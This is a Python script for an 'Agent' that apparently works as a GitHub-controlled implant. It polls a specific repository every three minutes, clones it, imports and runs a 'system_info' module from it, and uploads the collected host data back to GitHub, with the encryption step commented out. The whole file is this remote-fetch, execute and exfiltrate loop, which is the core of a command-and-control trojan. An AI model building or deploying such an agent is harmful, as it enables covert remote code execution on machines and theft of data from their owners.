import time
import os
import sys
import git
import shutil
from github_connector import GitHubConnector
from encryption import Encryption
from cryptography.fernet import Fernet

class Agent:
    def __init__(self):
        self.repository_url = "https://github.com/ErniedM/agent-framework2"
        self.key_path = "key.txt"
        self.github_connector = GitHubConnector(self.repository_url)
        self.encryption = Encryption(self.key_path)

    def run(self):
        while True:
            # Check the GitHub repository for updates
            if self.github_connector.check_for_updates():
                # Fetch the configuration file
                config = self.github_connector.get_config()
                self.execute_actions(config)
            time.sleep(180)  # Wait for 3 minutes before the next check

    def execute_actions(self, config):
        for action in config:
            if action["module"] == "system_info":
                module_name = action["module"]
                # Clone the repository to a local directory
                local_directory = "temp_directory"
                repo = git.Repo.clone_from(self.repository_url, local_directory)

                try:
                    # Add the local directory to the system path for module import
                    sys.path.append(os.path.join(os.path.dirname(__file__), "temp_directory"))

                    # Import the module and perform the necessary actions
                    import modules.system_info as system_info_module
                    system_info_module = system_info_module.SystemInfoModule()
                    data = system_info_module.collect_data()
                    # Remove the local directory
                    repo.close()
                    shutil.rmtree(local_directory)
                    ## encrypted_data = self.encryption.encrypt(data)
                    ## self.github_connector.log_data(encrypted_data)
                    self.github_connector.log_data(data)
                except ImportError:
                    print(f"Error importing module: {module_name}")
                except Exception as e:
                    print(f"Error executing module: {module_name}. Error message: {str(e)}")


if __name__ == "__main__":
    agent = Agent()
    agent.run()
